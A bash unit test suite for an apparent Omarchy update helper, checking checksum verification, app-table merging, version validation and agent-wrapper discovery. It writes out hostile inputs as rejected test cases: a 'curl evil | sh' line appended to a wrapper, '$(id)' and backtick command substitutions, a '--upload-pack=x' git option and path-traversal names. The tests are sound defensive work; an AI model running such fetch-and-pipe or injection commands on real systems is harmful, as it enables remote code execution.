#!/bin/bash
# Unit tests for bin/omabump-common. Plain bash: one line per test, stops at
# the first failure with a non-zero exit. Nothing touches the network: fetch,
# mise_run and the git network wrapper are stubbed below, and every XDG
# directory points into a scratch directory.
#
#   tests/run.sh
set -uo pipefail

root=$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)
# Scratch space inside the checkout, never the system temp directory.
mkdir -p "$root/.tests"
scratch=$(mktemp -d -p "$root/.tests")
trap 'rm -rf "$scratch"; rmdir "$root/.tests" 2>/dev/null' EXIT
export XDG_CONFIG_HOME=$scratch/config XDG_STATE_HOME=$scratch/state XDG_CACHE_HOME=$scratch/cache
mkdir -p "$XDG_CONFIG_HOME/omarchy/omabump" "$scratch/served"

# shellcheck source=../bin/omabump-common
source "$root/bin/omabump-common"

# Stubs. fetch serves $scratch/served/<basename of the last argument>.
fetch() {
  local url=${*: -1}
  [[ -f $scratch/served/${url##*/} ]] || return 22
  cat "$scratch/served/${url##*/}"
}
# shellcheck disable=SC2329 # stubs, called from omabump-common
mise_run() { echo "mise_run called in a test" >&2; return 1; }
pgit_net() { echo "pgit_net called in a test" >&2; return 1; }
# Discovery reads the machine's menu and ~/.local/bin; tests set its answer.
discover_out='{"agents":[],"errors":[]}'
discover_run() { printf '%s\n' "$discover_out"; }

n=0
pass() { n=$((n + 1)); echo "ok $n - $1"; }
fail() { n=$((n + 1)); echo "FAIL $n - $1${2:+: $2}"; exit 1; }
# check <name> <command...>: the command must succeed.
check() { local name=$1; shift; if "$@" >/dev/null; then pass "$name"; else fail "$name"; fi; }
# refuse <name> <command...>: the command must fail.
refuse() { local name=$1; shift; if "$@" >/dev/null 2>&1; then fail "$name" "expected a failure"; else pass "$name"; fi; }
# same <name> <expected> <actual>
same() { if [[ $3 == "$2" ]]; then pass "$1"; else fail "$1" "expected '$2', got '$3'"; fi; }

hexsum() { printf '%s' "$2" | "${1}sum" | cut -d' ' -f1; }
b64sum() { printf '%s' "$1" | python3 -c 'import base64, hashlib, sys; print(base64.b64encode(hashlib.sha512(sys.stdin.buffer.read()).digest()).decode())'; }

# --- clean_text ---------------------------------------------------------------

same "clean_text drops control characters and replaces angle brackets" \
  'a‹b›cdé' "$(clean_text $'a<b>\x01\nc\x7fd\té')"
same "clean_text replaces & for notify-send markup" 'a ＆amp; b' "$(clean_text 'a &amp; b')"
x=$(clean_text 'ééé'); same "the locale counts characters, not bytes" 'éé' "${x:0:2}"

same "term_safe: ESC shown, C0 and C1 controls neutralised, UTF-8 kept" \
  $'a^[[31mr\tb é ?2J\nz' "$(printf 'a\x1b[31m\x07r\r\tb é \xc2\x9b2J\nz' | term_safe)"

# --- vendor_checksum: feed ----------------------------------------------------

url=https://cdn.example.com/1.2.3/app-1.2.3-x86_64.pkg.tar.zst
feed_app='{"pkg":"app","checksum":"feed"}'
exact=$(b64sum exact) byname=$(b64sum byname)
cat >"$scratch/feed.yml" <<EOF
version: 1.2.3
files:
  - url: app-1.2.3-x86_64.pkg.tar.zst
    sha512: $byname
    size: 1
  - url: $url
    sha512: $exact
    size: 1
EOF
same "feed checksum: the exact url wins over a basename match" \
  "sha512 $(hexsum sha512 exact)" "$(vendor_checksum "$feed_app" "$url" 1.2.3 "$scratch/feed.yml")"
same "feed checksum: a basename match when the url differs" \
  "sha512 $(hexsum sha512 byname)" "$(vendor_checksum "$feed_app" https://mirror.example.com/app-1.2.3-x86_64.pkg.tar.zst 1.2.3 "$scratch/feed.yml")"
refuse "feed checksum: a file the feed does not list" \
  vendor_checksum "$feed_app" https://cdn.example.com/other.pkg.tar.zst 1.2.3 "$scratch/feed.yml"
printf 'files:\n  - url: %s\n    sha512: not*base64!\n' "$url" >"$scratch/bad.yml"
refuse "feed checksum: malformed base64" vendor_checksum "$feed_app" "$url" 1.2.3 "$scratch/bad.yml"
printf 'files:\n  - url: %s\n    sha512: %s\n' "$url" "$(printf 'short' | sha256sum | cut -d' ' -f1 | python3 -c 'import base64, sys; print(base64.b64encode(bytes.fromhex(sys.stdin.read().strip())).decode())')" >"$scratch/short.yml"
refuse "feed checksum: a digest of the wrong length" vendor_checksum "$feed_app" "$url" 1.2.3 "$scratch/short.yml"

# --- vendor_checksum: list ----------------------------------------------------

name='app-1.2.3-x86_64.pkg.tar.zst'
printf '%s  other.pkg.tar.zst\n%s  %s\n' "$(hexsum sha256 other)" "$(hexsum sha256 pkg)" "$name" >"$scratch/served/SHA256SUMS"
printf '%s *%s\n' "$(hexsum sha512 pkg)" "$name" >"$scratch/served/SHA512SUMS"
list_app() { jq -cn --arg url "$1" --arg algo "$2" '{pkg: "app", checksum: {url: $url, algo: $algo}}'; }
same "list checksum: sha256" "sha256 $(hexsum sha256 pkg)" \
  "$(vendor_checksum "$(list_app 'https://example.com/{version}/SHA256SUMS' sha256)" "$url" 1.2.3 /dev/null)"
same "list checksum: sha512 with a binary-mode marker" "sha512 $(hexsum sha512 pkg)" \
  "$(vendor_checksum "$(list_app 'https://example.com/{version}/SHA512SUMS' sha512)" "$url" 1.2.3 /dev/null)"
refuse "list checksum: a sha512 list read as sha256" \
  vendor_checksum "$(list_app https://example.com/SHA512SUMS sha256)" "$url" 1.2.3 /dev/null
refuse "list checksum: an algorithm other than sha256 or sha512" \
  vendor_checksum "$(list_app https://example.com/SHA256SUMS md5)" "$url" 1.2.3 /dev/null
refuse "list checksum: a plain http list" \
  vendor_checksum "$(list_app http://example.com/SHA256SUMS sha256)" "$url" 1.2.3 /dev/null
refuse "list checksum: a list that cannot be fetched" \
  vendor_checksum "$(list_app https://example.com/MISSING sha256)" "$url" 1.2.3 /dev/null
refuse "no checksum source" vendor_checksum '{"pkg":"app"}' "$url" 1.2.3 /dev/null

# --- apps_table ---------------------------------------------------------------

real_shipped=$shipped_apps
shipped_apps=$scratch/shipped.json
cat >"$shipped_apps" <<'EOF'
[
  {"pkg": "a", "label": "A", "source": "indicator", "feed": {"type": "command", "command": "echo 6.6.6"}, "_userFeed": true},
  {"pkg": "b", "label": "B", "source": "indicator", "feed": {"type": "aur-rpc"}},
  {"pkg": "c", "label": "C", "source": "indicator"}
]
EOF
cat >"$user_apps" <<'EOF'
[
  {"pkg": "a", "label": "A2"},
  {"pkg": "b", "label": "B2", "feed": {"type": "command", "command": "echo 1.2.3"}},
  {"pkg": "c", "disabled": true},
  {"pkg": "d", "label": "D", "source": "indicator", "feed": {"type": "github-release", "repo": "o/d"}, "_userFeed": false}
]
EOF
table=$(apps_table)
same "apps_table: shipped order, user additions after, disabled hidden" 'a b d' "$(jq -r 'map(.pkg) | join(" ")' <<<"$table")"
same "apps_table: a user entry overrides fields" 'A2 B2' "$(jq -r '[.[0].label, .[1].label] | join(" ")' <<<"$table")"
same "apps_table: _userFeed is never taken from the shipped file" 'null' "$(jq -c '.[0]._userFeed' <<<"$table")"
same "apps_table: a user feed marks the entry" 'true true' "$(jq -r '[.[1]._userFeed, .[2]._userFeed] | join(" ")' <<<"$table")"
same "feed_version: a command feed from the user's file runs" 1.2.3 "$(feed_version "$(app_json b)")"
same "feed_version: a command feed from the shipped file is refused" \
  "command feeds are allowed only from ~/.config/omarchy/omabump/apps.json" "$(feed_version "$(app_json a)" 2>&1 >/dev/null)"
cat >"$user_apps" <<'EOF'
[
  {"pkg": "../../victim", "source": "indicator"},
  {"pkg": "-x", "source": "indicator"},
  {"pkg": "e", "source": "indicator", "installed": ["e", "../f"]},
  {"pkg": "mise:g", "source": "mise", "tool": ["g", "npm:@scope/g"]},
  {"pkg": "mise:h", "source": "mise", "tool": "npm:../h"},
  {"pkg": "mise:i", "source": "indicator"},
  {"pkg": 7}
]
EOF
same "apps_table: entries with bad pkg, installed or tool names are dropped" \
  'a b c mise:g' "$(apps_table 2>/dev/null | jq -r 'map(.pkg) | join(" ")')"
same "apps_table: each dropped entry is named on stderr" 5 "$(apps_table 2>&1 >/dev/null | grep -c '^ignoring app')"
check "pkg_name_ok: claude-desktop" pkg_name_ok claude-desktop
check "pkg_name_ok: lib32-foo+bar@x_y.z" pkg_name_ok lib32-foo+bar@x_y.z
refuse "pkg_name_ok: a leading dot" pkg_name_ok .foo
refuse "pkg_name_ok: a leading dash" pkg_name_ok -foo
refuse "pkg_name_ok: a slash" pkg_name_ok foo/bar
refuse "pkg_name_ok: upper case" pkg_name_ok Foo
check "app_id_ok: mise:claude" app_id_ok mise:claude
refuse "app_id_ok: mise:../x" app_id_ok mise:../x
check "tool_name_ok: npm:@anthropic-ai/claude-code" tool_name_ok npm:@anthropic-ai/claude-code
refuse "tool_name_ok: .." tool_name_ok npm:@a/../b
refuse "tool_name_ok: a leading dash" tool_name_ok -t
check "ref_ok: refs/pull/725/head" ref_ok refs/pull/725/head
refuse "ref_ok: not under refs/" ref_ok heads/master
refuse "ref_ok: .." ref_ok refs/heads/../x
refuse "ref_ok: a space" ref_ok 'refs/heads/a b'
refuse "ref_ok: an option" ref_ok --upload-pack=x
same "recipe_fetch: a recipeFetch outside refs/ is refused" "recipeFetch '--upload-pack=x' is not a refs/ name" \
  "$(recipe_fetch 0123456789abcdef0123456789abcdef01234567 '{"recipeFetch": "--upload-pack=x"}' 2>&1 >/dev/null | grep recipeFetch)"
echo '{"pkg": "x"}' >"$user_apps"
same "apps_table: a user file that is not an array is ignored" 'a b c' "$(apps_table 2>/dev/null | jq -r 'map(.pkg) | join(" ")')"
rm -f "$user_apps"

# --- discovered agents in the app table -----------------------------------------

cat >"$shipped_apps" <<'EOF2'
[
  {"pkg": "mise:grok-cli", "label": "Grok CLI", "source": "mise", "command": "grok", "tool": ["npm:@xai-official/grok"]},
  {"pkg": "mise:oh-my-pi", "label": "Oh My Pi", "source": "mise", "tool": "github:can1357/oh-my-pi"},
  {"pkg": "mise:claude", "label": "Claude Code", "source": "mise", "command": "claude", "tool": ["npm:x/claude", "claude"]},
  {"pkg": "app", "label": "App", "source": "indicator"}
]
EOF2
disc_agent() { jq -cn --arg c "$1" --arg k "$2" --arg l "${3:-$1}" '{command: $c, key: $k, label: $l, source: "wrapper"}'; }
set_discovered() { discover_out=$(printf '%s\n' "$@" | jq -sc '{agents: ., errors: []}'); }
set_discovered "$(disc_agent grok grok Grok)" "$(disc_agent omp github:can1357/oh-my-pi omp)" \
  "$(disc_agent claude claude Claude)" "$(disc_agent muse http:muse 'Muse Code')"
tools_of() { jq -r --arg p "$1" '.[] | select(.pkg == $p) | [.tool] | flatten | join(" ")' <<<"$app_table"; }
load_table
same "merge: attach by command, the discovered key first" 'grok npm:@xai-official/grok' "$(tools_of mise:grok-cli)"
same "merge: attach by a tool alias" 'github:can1357/oh-my-pi' "$(tools_of mise:oh-my-pi)"
same "merge: a key already listed moves first, no duplicate" 'claude npm:x/claude' "$(tools_of mise:claude)"
same "merge: an unknown agent becomes a row with the menu label" 'mise:muse|Muse Code|http:muse|true' \
  "$(jq -r '.[-1] | [.pkg, .label, (.tool | join(" ")), .discovered] | join("|")' <<<"$app_table")"
same "merge: curated labels stay" 'Grok CLI Oh My Pi Claude Code' "$(jq -r '[.[] | select(.source == "mise" and (.discovered | not)) | .label] | join(" ")' <<<"$app_table")"
same "merge: the frozen table is what app_json reads" "$(jq -c '.[] | select(.pkg == "mise:muse")' <<<"$app_table")" "$(app_json http:muse)"
discover_out='{"agents":[],"errors":[]}'
same "merge: app_json keeps the frozen table after discovery changes" 'mise:muse' "$(app_json mise:muse | jq -r .pkg)"
set_discovered "$(disc_agent grok grok Grok)" "$(disc_agent omp github:can1357/oh-my-pi omp)" \
  "$(disc_agent claude claude Claude)" "$(disc_agent muse http:muse 'Muse Code')"
printf '[{"pkg": "mise:grok-cli", "disabled": true}, {"pkg": "mise:muse", "disabled": true}, {"pkg": "mise:claude", "tool": "npm:x/claude"}]' >"$user_apps"
load_table
same "merge: disabled rows stay hidden, by pkg and by mise:<command>" 'mise:oh-my-pi mise:claude app' "$(jq -r 'map(.pkg) | join(" ")' <<<"$app_table")"
same "merge: a tool list the user sets is not extended" 'npm:x/claude' "$(tools_of mise:claude)"
discover_out='{"agents":[{"command":"x","key":"../x","label":"X","source":"wrapper"}],"errors":["bad menu"]}'
load_table 2>/dev/null
same "merge: a discovered key with bad characters drops the row" 'mise:oh-my-pi mise:claude app' "$(jq -r 'map(.pkg) | join(" ")' <<<"$app_table" 2>/dev/null)"
same "discovery errors are kept" 'bad menu' "$discovery_error"
discover_out='not json'
load_table
same "a discovery helper that fails is an error, the table stays" 'bin/omabump-discover failed|3' "$discovery_error|$(jq length <<<"$app_table")"
discover_out='{"agents":[],"errors":[]}'
rm -f "$user_apps"
app_table=""
shipped_apps=$real_shipped

# --- recipe_version -----------------------------------------------------------

same "recipe_version: plain" 'foo 1.2.3-1' "$(printf 'pkgname=foo\npkgver=1.2.3\npkgrel=1\n' | recipe_version)"
same "recipe_version: quoted, with an epoch" 'foo-bin 2:1.2.3-4' "$(printf "pkgname='foo-bin'\npkgver=\"1.2.3\"\npkgrel=4\nepoch=2\n" | recipe_version)"
same "recipe_version: epoch=0 is no epoch" 'foo 1.0-1' "$(printf 'pkgname=foo\npkgver=1.0\npkgrel=1\nepoch=0\n' | recipe_version)"
refuse "recipe_version: an unreadable pkgver" recipe_version <<<$'pkgname=foo\npkgver=$(echo 1)\npkgrel=1'
refuse "recipe_version: an unreadable epoch" recipe_version <<<$'pkgname=foo\npkgver=1.0\npkgrel=1\nepoch=a'
refuse "recipe_version: no pkgrel" recipe_version <<<$'pkgname=foo\npkgver=1.0'
refuse "recipe_version: a pkgname with a leading dash" recipe_version <<<$'pkgname=-foo\npkgver=1.0\npkgrel=1'

# --- version_ok, upstream_part ------------------------------------------------

check "version_ok: 1.2.3" version_ok 1.2.3
check "version_ok: 1.0+git~r1_x" version_ok 1.0+git~r1_x
refuse "version_ok: an epoch" version_ok 2:1.0
refuse "version_ok: a leading dot" version_ok .1
refuse "version_ok: a leading dash" version_ok -1
refuse "version_ok: a dot segment" version_ok ..
refuse "version_ok: .. inside" version_ok 1..2
check "version_ok: 64 characters" version_ok "$(printf '1%.0s' {1..64})"
refuse "version_ok: 65 characters" version_ok "$(printf '1%.0s' {1..65})"
check "full_version_ok: 2:1.0+git~r1_x-1" full_version_ok 2:1.0+git~r1_x-1
check "full_version_ok: no epoch, pkgrel 1.1" full_version_ok 1.2.3-1.1
refuse "full_version_ok: no pkgrel" full_version_ok 1.2.3
refuse "full_version_ok: a letter epoch" full_version_ok a:1.2.3-1
refuse "full_version_ok: a dot segment" full_version_ok 1:..-1
refuse "full_version_ok: a space" full_version_ok '1.2 3-1'
refuse "version_ok: a space" version_ok '1.2 3'
refuse "version_ok: a slash" version_ok 1.2/3
# The literal text, not its expansion, is what version_ok must refuse.
# shellcheck disable=SC2016
refuse "version_ok: a command substitution" version_ok '$(id)'
refuse "version_ok: empty" version_ok ''
same "upstream_part: epoch and pkgrel cut" 1.2.3 "$(upstream_part 2:1.2.3-4)"
same "upstream_part: pkgrel cut" 1.2.3 "$(upstream_part 1.2.3-1)"

# --- apt_newest ---------------------------------------------------------------

index=$'Package: claude-desktop\nVersion: 1.9.0\n\nPackage: claude-desktop-beta\nVersion: 9.9.9\n\nPackage: claude-desktop\r\nVersion: 1.10.0\r\n\r\nPackage: claude-desktop\nVersion: 1.2.0'
same "apt_newest: vercmp order, exact package name, CRLF stanzas" 1.10.0 "$(apt_newest "$index" claude-desktop)"
refuse "apt_newest: a package the index lacks" apt_newest "$index" claude
index=$'Package: app\nVersion: 9.9.9/../x\n\nPackage: app\nVersion: 1.0\n\nPackage: app\nVersion: $(id)'
same "apt_newest: versions version_ok refuses are skipped" 1.0 "$(apt_newest "$index" app)"
index=$(for i in $(seq 1 600); do printf 'Package: app\nVersion: %s.0\n\n' "$i"; done)
same "apt_newest: only the first 500 matching stanzas count" 500.0 "$(apt_newest "$index" app)"

# --- pkgs_pin -----------------------------------------------------------------

repin() { pkgs_base="" pkgs_follow=0 pkgs_pin_ref="" pkgs_pin_error=""; pkgs_pin 2>/dev/null; }
shipped_commit=$(jq -r .omarchyPkgs.commit "$shipped_pins")
repin
same "pkgs_pin: the shipped pin" "$shipped_commit 0" "$pkgs_base $pkgs_follow"
other=0123456789abcdef0123456789abcdef01234567
echo "{\"omarchyPkgs\": {\"commit\": \"$other\"}}" >"$user_pins"
repin
same "pkgs_pin: a user commit overrides the pin" "$other 0" "$pkgs_base $pkgs_follow"
echo '{"omarchyPkgs": {"follow": "master"}}' >"$user_pins"
repin
same "pkgs_pin: following master" "1 refs/heads/master" "$pkgs_follow $pkgs_pin_ref"
echo '{"omarchyPkgs": {"follow": "dev"}}' >"$user_pins"
repin
same "pkgs_pin: an unknown branch to follow is an error" "0 x" "$pkgs_follow ${pkgs_pin_error:+x}$pkgs_base"
echo '{"omarchyPkgs": {"commit": "abc123"}}' >"$user_pins"
repin
same "pkgs_pin: a malformed commit leaves no base" "x" "${pkgs_pin_error:+x}$pkgs_base"
echo '{"omarchyPkgs": {"ref": "refs/heads/../x"}}' >"$user_pins"
repin
same "pkgs_pin: a ref outside refs/ or with .. leaves no base" "x" "${pkgs_pin_error:+x}$pkgs_base"
echo '[]' >"$user_pins"
repin
same "pkgs_pin: a user file that is not an object is ignored" "$shipped_commit" "$pkgs_base"
rm -f "$user_pins"
repin

# --- the clone lock -----------------------------------------------------------

mkdir -p "$cache_dir"
# The holder becomes the sleep itself, so killing it frees the lock.
(exec 9>"$pkgs_lock"; flock 9; exec sleep 30) &
holder=$!
for _ in $(seq 50); do flock -n "$pkgs_lock" true || break; sleep 0.1; done
pkgs_with_lock true; rc=$?
kill "$holder" 2>/dev/null; wait "$holder" 2>/dev/null
same "pkgs_with_lock: busy while another process holds the lock" 75 "$rc"
check "pkgs_with_lock: runs once the lock is free" pkgs_with_lock true

# --- mise: inventory, safe backends, outdated -------------------------------------

real_shipped=$shipped_apps
shipped_apps=$scratch/shipped.json
cat >"$shipped_apps" <<'EOF2'
[
  {"pkg": "mise:a", "source": "mise", "tool": ["a", "npm:a"]},
  {"pkg": "mise:b", "source": "mise", "tool": "b"},
  {"pkg": "mise:c", "source": "mise", "tool": "asdf:c"},
  {"pkg": "mise:d", "source": "mise", "tool": "d"},
  {"pkg": "mise:e", "source": "mise", "tool": "e"}
]
EOF2
mise_calls=$scratch/mise.calls
# The stub answers like mise does here: a and b on aqua (b only inactive
# besides), c through asdf, d not installed, e on http.
mise_run() {
  printf '%s\n' "$*" >>"$mise_calls"
  case $* in
    "ls --json") echo '{"a":[{"version":"1.0","installed":true,"active":true}],"npm:a":[{"version":"0.9","installed":true,"active":true}],
      "b":[{"version":"2.0","installed":true,"active":false}],"asdf:c":[{"version":"3.0","installed":true,"active":true}],
      "d":[{"version":"4.0","installed":false,"active":true}],"e":[{"version":"5.0","installed":true,"active":true}]}' ;;
    "ls --json --backend aqua") echo '{"a":[],"npm:a":[],"b":[]}' ;;
    "ls --json --backend http") echo '{"e":[]}' ;;
    "ls --json --backend gem") [[ -z ${mise_fail_backend:-} ]] || return 1; echo '{}' ;;
    "ls --json --backend "*) echo '{}' ;;
    "outdated --json -- "*) [[ -z ${mise_fail_outdated:-} ]] || { echo "boom" >&2; return 1; }
      echo '{"e":{"latest":"5.1","requested":"latest"}}' ;;
    "outdated --bump --json -- "*) [[ -z ${mise_fail_bump:-} ]] || { echo "bump boom" >&2; return 1; }
      echo '{"a":{"bump":"1.2","latest":"1.2","requested":"1.0"},"e":{"bump":"5.1","latest":"5.1","requested":"latest"}}' ;;
    *) return 1 ;;
  esac
}
# shellcheck disable=SC2329 # mise_load checks for it with command -v
mise() { :; }
reset_mise() { : >"$mise_calls"; mise_ls_json='{}' mise_safe_json='{}' mise_outdated_json='{}' mise_bump_json='{}' mise_error="" mise_bump_error="" mise_backend_error=""; }
load_table; reset_mise
mise_load 1
same "mise: outdated and bump name only the selected keys on safe backends, after --" \
  $'outdated --json -- a e\noutdated --bump --json -- a e' "$(grep '^outdated' "$mise_calls")"
same "mise: one ls per allowed backend plus the inventory" 13 "$(grep -c '^ls' "$mise_calls")"
row() { mise_row "$1" "$2"; echo "${latest}|${installable}|${mise_update}|${note}|${feed_error}"; }
same "mise_row: an update mise up reaches" '5.1|true|true||' "$(row e 5.0)"
same "mise_row: pinned below a newer release" '1.2|false|false|Pinned to 1.0, 1.2 exists|' "$(row a 1.0)"
same "mise_row: a key on asdf is not checked and never current" '|false|false|Update check skipped: asdf backend|' "$(row asdf:c 3.0)"
reset_mise
mise_fail_bump=1 mise_load 1
same "mise_row: a bump failure is a check failure, not current" '|true|false||mise outdated --bump failed: bump boom' "$(row a 1.0)"
same "mise_row: a bump failure leaves outdated's answer" '5.1|true|true||' "$(row e 5.0)"
reset_mise
mise_fail_outdated=1 mise_load 1
same "mise_row: an outdated failure" '|true|false||mise outdated failed: boom' "$(row e 5.0)"
reset_mise
mise_fail_backend=1 mise_load 1
same "mise: a failing backend listing is a diagnostic, the rest still load" 'mise ls --backend gem failed|a e' "$mise_backend_error|${mise_query[*]}"
cat >"$shipped_apps" <<'EOF2'
[{"pkg": "mise:c", "source": "mise", "tool": "asdf:c"}, {"pkg": "mise:d", "source": "mise", "tool": "d"}]
EOF2
load_table; reset_mise
mise_load 1
same "mise: no safe selected key, no outdated call" 0 "$(grep -c '^outdated' "$mise_calls")"
unset -f mise
mise_run() { echo "mise_run called in a test" >&2; return 1; }
reset_mise
shipped_apps=$real_shipped
app_table=""

# --- omabump-discover ----------------------------------------------------------

disc=$scratch/discover
mkdir -p "$disc/bin"
discover() { python3 "$root/bin/omabump-discover" --stock "$disc/stock.jsonc" --user "$disc/user.jsonc" --bin-dir "$disc/bin" "$@"; }
agents() { discover "$@" | jq -r '.agents | map("\(.command)=\(.key)/\(.source)") | join(" ")'; }
wrapper() { printf '#!/bin/bash\nexport MISE_MINIMUM_RELEASE_AGE=0\nmise use -g --quiet "%s" || exit 1\nexec mise x "%s" -- "%s" "$@"\n' "$2" "${3:-$2}" "$1"; }
cat >"$disc/stock.jsonc" <<'EOF2'
{
  // A comment, and one with a URL: https://example.com
  "setup.default.agent": {"label": "Agent"},
  "setup.default.agent.claude": {"label": "Claude", "action": "omarchy-default-agent claude", /* inline */},
  "setup.default.agent.muse": {"label": "Muse // not a comment", "description": "https://example.com/x"},
  "setup.default.agent.omp": {"label": "omp"},
  "setup.default.agent.claude.extra": {"label": "Nested"},
  "setup.default.agent.Bad": {"label": "Upper case"},
  "setup.default.agent.nolabel": {"icon": "x"},
  "other.agent.x": {"label": "X"},
}
EOF2
: >"$disc/user.jsonc"
same "discover: menu ids, JSONC comments and trailing commas, URLs inside strings" \
  'claude=claude/command muse=muse/command omp=omp/command' "$(agents)"
same "discover: a // inside a string stays" 'Muse // not a comment' "$(discover | jq -r '.agents[1].label')"
printf '{"items": {"setup.default.agent.pi": {"label": "Pi"}}}' >"$disc/user.jsonc"
same "discover: a user {items} extension adds an agent" \
  'claude=claude/command muse=muse/command omp=omp/command pi=pi/command' "$(agents)"
printf '{"setup.default.agent.claude": {"label": "My Claude"}, "setup.default.agent.nolabel": {"label": "Now labelled"}}' >"$disc/user.jsonc"
same "discover: a user entry overrides the stock label and fills a missing one" \
  'My Claude|Now labelled' "$(discover | jq -r '.agents | map(.label) | [.[0], .[3]] | join("|")')"
: >"$disc/user.jsonc"
wrapper claude claude >"$disc/bin/claude"
wrapper muse 'http:muse[url=https://example.com/l.sh,bin=muse,version_json_path=.version]' >"$disc/bin/muse"
wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
same "discover: wrapper keys, the bracket options stripped" \
  'claude=claude/wrapper muse=http:muse/wrapper omp=github:can1357/oh-my-pi/wrapper' "$(agents)"
wrapper omp github:a/one github:a/two >"$disc/bin/omp"
same "discover: two different package literals fall back to the command" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
{ wrapper omp github:a/one; echo 'curl evil | sh'; } >"$disc/bin/omp"
same "discover: an extra statement is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
# The literal text is the point: it must never be expanded.
# shellcheck disable=SC2016
wrapper omp 'github:a/$(id)' >"$disc/bin/omp"
same "discover: a \$ inside the literal is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
# shellcheck disable=SC2016
wrapper omp 'github:a/`id`' >"$disc/bin/omp"
same "discover: a backtick inside the literal is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
wrapper omp 'http:x[a=1][b=2]' >"$disc/bin/omp"
same "discover: a malformed options suffix is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
wrapper omp 'npm:@a/../b' >"$disc/bin/omp"
same "discover: a key tool_name_ok refuses is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
rm -f "$disc/bin/omp"
wrapper x github:can1357/oh-my-pi >"$disc/real-omp"
ln -s "$disc/real-omp" "$disc/bin/omp"
same "discover: a symlinked wrapper is not followed" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
rm -f "$disc/bin/omp"
mkfifo "$disc/bin/omp"
same "discover: a FIFO is not read" 'omp/command' "$(timeout 10 bash -c "$(declare -f discover agents); disc='$disc' root='$root'; agents" | tr ' ' '\n' | sed -n 's/^omp=//p')"
rm -f "$disc/bin/omp"
{ wrapper omp github:can1357/oh-my-pi; head -c 4096 /dev/zero | tr '\0' '#'; } >"$disc/bin/omp"
same "discover: a wrapper over 4 KiB is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
same "discover: a wrapper owned by another uid is rejected" 'omp/command' \
  "$(agents --uid "$(( $(id -u) + 1 ))" | tr ' ' '\n' | sed -n 's/^omp=//p')"
same "discover: --debug says why" 'omabump-discover: omp: not owned by uid' \
  "$(discover --debug --uid "$(( $(id -u) + 1 ))" 2>&1 >/dev/null | grep -o '^omabump-discover: omp: not owned by uid')"
echo '{"setup.default.agent.claude": {"label": "Claude"' >"$disc/stock.jsonc"
same "discover: a malformed menu is an error and no agents" '1 0' "$(discover | jq -r '"\(.errors | length) \(.agents | length)"')"
rm -f "$disc/stock.jsonc"
same "discover: a missing menu is an error" 'no Omarchy menu at' "$(discover | jq -r '.errors[0]' | grep -o '^no Omarchy menu at')"
check "omabump-discover compiles" env PYTHONPYCACHEPREFIX="$scratch/pycache" python3 -m py_compile "$root/bin/omabump-discover"

# --- the shipped apps.json and pins.json --------------------------------------

check "apps.json is a JSON array" jq -e 'type == "array"' "$root/apps.json"
same "apps.json has no command feeds" 0 "$(jq '[.[] | select(.feed.type == "command")] | length' "$root/apps.json")"
same "apps.json sets no _userFeed" 0 "$(jq '[.[] | select(has("_userFeed"))] | length' "$root/apps.json")"
same "every pkg in apps.json is unique" '[]' "$(jq -c 'map(.pkg) | group_by(.) | map(select(length > 1) | .[0])' "$root/apps.json")"
vendor_ok=1
while IFS= read -r app; do vendor_checksum_declared "$app" || vendor_ok=0; done < <(jq -c '.[] | select(.source == "vendor-pkg")' "$root/apps.json")
check "every vendor-pkg in apps.json names a checksum source" test "$vendor_ok" = 1
check "pins.json pins a 40-hex commit" jq -e '.omarchyPkgs.commit | test("^[0-9a-f]{40}$")' "$root/pins.json"
# Omarchy's lazy wrappers (omarchy-mise-install) call `mise use -g <name>`;
# the key mise ls reports is that name, so the table must carry it.
for t in claude codex crush opencode grok copilot cursor-agent pi github:can1357/oh-my-pi; do
  # $t inside the single quotes is jq's variable, not the shell's.
  # shellcheck disable=SC2016
  check "apps.json tracks Omarchy's mise tool $t" jq -e --arg t "$t" 'any(.[]; .source == "mise" and ([.tool] | flatten | index($t)))' "$root/apps.json"
done
mise_ls_json='{"grok":[{"version":"1.0.46","installed":true,"active":true}]}'
same "the Grok CLI row finds mise's first-party grok" "grok 1.0.46" "$(mise_active "$(app_json mise:grok-cli)")"
mise_ls_json='{}'

echo "all $n tests passed"
